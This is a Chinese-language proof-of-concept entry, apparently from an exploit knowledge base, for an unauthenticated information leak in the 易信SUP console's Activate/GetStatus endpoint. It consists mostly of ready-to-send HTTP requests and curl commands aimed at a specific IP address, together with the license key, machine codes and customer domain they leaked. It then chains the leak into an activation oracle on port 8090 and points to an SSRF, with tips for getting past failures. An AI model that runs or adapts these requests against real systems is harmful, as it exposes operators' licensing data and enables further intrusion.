# 易信SUP 控制台 /api/console/Activate/GetStatus 未授权直读 license_key、机器码与绑定域名

- **code**: yixin-sup-console-activate-getstatus-unauth-license-metadata
- **kind**: poc
- **category**: info-leak
- **component**: 易信SUP（易信Sup 控制台 /api/console，Go 后端；1.0.43/1.0.44 均复现）
- **versions**: 1.0.43、1.0.44
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#616，2026-11-06T07:2xZ，本机 curl.exe --noproxy '*' 直连 149.104.30.75 实测（全程不带 Cookie/Token）：① :8081 POST /api/console/Activate/GetStatus body {} → 200 {"code":0,"data":{"activated":true,"days_left":319,"domains":"pc.kuaishou.xin","expire_at":1821489306,"license_key":"YS-M85X-QC85-****-****","machine_code":"2e90cf89791b827a","plan":"standard","locked":false,"status":1},"message":"ok"}；② :8080（1.0.43）同请求 → 200 同结构、同一 license_key、machine_code=b2d7279a95891033、locked=true、fail_cnt=6693，说明 locked 状态不影响该端点回显。判定成立依据：无任何鉴权头即返回 license_key/machine_code/绑定域名/套餐到期等授权全量元数据。
- **path**: pocs/yixin-sup-console-activate-getstatus-unauth-license-metadata/yixin_sup_getstatus_unauth.http
- **tags**: 易信sup, 易信, sup, getstatus, activate, license_key, machine_code, 未授权, info-leak, 授权信息泄露, go
- **created_at**: 2026-11-05T23:32:25.274Z
- **engine**: 149.104.30.75:8081, 149.104.30.75:8080
- **found_by**: exploit

## 描述

易信SUP 控制台的激活状态接口未做鉴权，POST 空 JSON {} 即返回本机授权全量元数据（license_key、machine_code、绑定域名、套餐、到期时间、失败次数）。无需账号，仅要求实例已激活；泄露的 key 可继续喂给同产品 :8090 /auth/activate 未授权 oracle 拿完整白名单与 RSA 签名，也可用于判断实例版本与授权归属。

## 用法

```
前置：控制台端口可达（默认 8080/8081 等），实例已激活（activated=true）。不需要 Cookie/Token/验证码，locked=true 也不影响。

1) 单发确认（只发一次，body 必须是字面量 {} 且带 JSON Content-Type）：
   curl -sS --noproxy '*' -i -X POST http://TARGET:8081/api/console/Activate/GetStatus -H 'Content-Type: application/json' -d '{}'

2) 版本对照：1.0.43 换 8080 端口同请求。两实例常共用同一 license_key，仅 machine_code/locked 不同 → 可作为「同一授权被多机复用」的证据。

3) 判据：200 且 body 为 {"code":0,...,"data":{...,"license_key":"...","machine_code":"..."},"message":"ok"} 即成立；activated=false 只说明未激活，端点仍可能未鉴权。

4) 后续利用：把 license_key + machine_code POST 到 :8090 /auth/activate，可换出完整域名/IP 白名单、套餐与 RSA 签名（见 kb 条目 yixin-sup-auth-activate-unauth-license-metadata-oracle）；要强行激活实例走 Activate/GoSystem SSRF（见易信sup-后台-activate-gosystem-auth_server-客户端可控-ssrf-盲探-127.0）。

失败常见原因：404 = 版本更新后路径改名或控制台不在该端口；401/302 跳登录页 = 新版给该接口加了鉴权（先登录拿 Cookie 再打，或改打 :8090 /auth/activate）；返回 HTML 多为反代命中前台站点，换端口/加 Host。
```

## 正文

```
# 易信SUP /api/console/Activate/GetStatus 未授权授权信息泄露
# 判据：200 + code:0 + data.license_key / data.machine_code
# 前置：控制台端口可达、实例已激活；无需 Cookie/Token/验证码

### 1) 1.0.44 实例（8081）
POST /api/console/Activate/GetStatus HTTP/1.1
Host: 149.104.30.75:8081
Content-Type: application/json
Content-Length: 2

{}

# => HTTP 200
# {"code":0,"data":{"activated":true,"days_left":319,"domains":"pc.kuaishou.xin",
#  "expire_at":1821489306,"license_key":"YS-M85X-QC85-****-****",
#  "machine_code":"2e90cf89791b827a","plan":"standard","locked":false,"status":1},
#  "message":"ok"}

### 2) 1.0.43 实例（8080）——同一 license_key，machine_code 不同，locked=true 仍回显
POST /api/console/Activate/GetStatus HTTP/1.1
Host: 149.104.30.75:8080
Content-Type: application/json
Content-Length: 2

{}

# => HTTP 200，同上结构，machine_code=b2d7279a95891033、locked=true、fail_cnt=6693

### 3) 等价 curl
curl -sS --noproxy '*' -i -X POST http://TARGET:8081/api/console/Activate/GetStatus \
  -H 'Content-Type: application/json' -d '{}'

### 4) 拿到 license_key 后接着打 8090 授权服务器 oracle
curl -sS --noproxy '*' -X POST http://TARGET:8090/auth/activate \
  -H 'Content-Type: application/json' \
  -d '{"license_key":"<leaked>","machine_code":"2e90cf89791b827a","version":"1.0.44"}'

# 说明：
# - 响应里的 domains/expire_at/plan 为该授权绑定的客户域名、到期时间戳、套餐档位，
#   可直接用于资产归属判断；fail_cnt 反映该 license 被多少机器/错误尝试用过。
# - activated=false 时端点通常仍可访问，只是没有 license 字段。
# - 若 404/401，见条目 usage 中的失败原因排查。

```
